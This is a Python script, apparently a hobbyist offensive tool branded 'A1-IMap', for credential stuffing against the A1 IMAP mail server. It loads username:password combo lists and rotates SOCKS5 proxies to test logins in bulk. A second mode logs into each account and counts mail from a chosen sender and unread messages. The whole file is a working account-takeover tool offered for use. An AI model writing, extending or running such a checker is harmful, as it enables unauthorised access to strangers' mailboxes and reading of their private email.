import os
import imaplib
import time
import random
import socks
import socket

IMAP_SERVER = 'imap.a1.net'
IMAP_PORT = 143

ASCII_TEXT = """
    _    ___  _   _           ___ __  __             
   / \  / _ \| \ | |         |_ _|  \/  | __ _ _ __  
  / _ \| | | |  \| |  _____   | || |\/| |/ _` | '_ \ 
 / ___ \ |_| | |\  | |_____|  | || |  | | (_| | |_) |
/_/   \_\___/|_| \_|         |___|_|  |_|\__,_| .__/ 
                                              |_|   

 v2                    made by pxmps with <3

"""

def show_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(ASCII_TEXT)
    print("1. Auth-Checker")
    print("2. Inbox-Checker")
    print("3. Exit")

def check_credentials(credentials_list, proxies_list):
    updated_credentials_list = []
    for credentials in credentials_list:
        username, password = credentials.strip().split(':')
        proxy = random.choice(proxies_list)
        proxy_host, proxy_port = proxy.strip().split(':')
        try:
            socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
            socket.socket = socks.socksocket

            imap = imaplib.IMAP4(IMAP_SERVER, IMAP_PORT)
            imap.starttls()
            imap.login(username, password)
            print(f"AUTH_SUCCEED -> {username} using proxy {proxy_host}:{proxy_port}")
            imap.logout()
        except Exception as e:
            print(f"AUTH_FAILED -> {username} using proxy {proxy_host}:{proxy_port}")
            updated_credentials_list.append(credentials)

    with open('combo.txt', 'w') as file:
        file.writelines(updated_credentials_list)

    show_menu()

def count_emails_from_sender(sender_email, credentials_list):
    successful_logins = 0
    unread_emails = 0
    for credentials in credentials_list:
        username, password = credentials.strip().split(':')
        try:
            imap = imaplib.IMAP4(IMAP_SERVER, IMAP_PORT)
            imap.starttls()
            imap.login(username, password)

            status, messages = imap.select('INBOX')

            if status == 'OK':
                status, response = imap.search(None, f'(FROM "{sender_email}")')
                if status == 'OK':
                    email_count = len(response[0].split())
                    print(f"{username} -> {sender_email}: {email_count}")
                    successful_logins += 1
                else:
                    print(f"VIEW_FAILED -> {sender_email} for {username}")

                status, response = imap.search(None, '(UNSEEN)')
                if status == 'OK':
                    unread_emails += len(response[0].split())
                else:
                    print(f"VIEW_FAILED -> {username}")

            else:
                print(f"FAILED TO OPEN INBOX -> {username}")

            imap.logout()
        except imaplib.IMAP4.error as e:
            error_message = str(e)
            if 'Authentication failed' in error_message:
                print(f"AUTH_FAILED -> {username}")
            else:
                print(f"SERVER_FAILED -> {username}: {error_message}")

    input("            --> hit enter main-menu <--")
    show_menu()

def main():
    while True:
        show_menu()
        choice = input("Choose one option: ")
        if choice == '1':
            with open('combo.txt', 'r') as file:
                credentials_list = file.readlines()
            with open('proxy.txt', 'r') as file:
                proxies_list = file.readlines()
            check_credentials(credentials_list, proxies_list)
        elif choice == '2':
            with open('combo.txt', 'r') as file:
                credentials_list = file.readlines()

            sender_email = input("? Mail: ")

            count_emails_from_sender(sender_email, credentials_list)
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '3':
            print("Program quit.")
            break
        else:
            print("INVALID, try again.")

if __name__ == "__main__":
    main()
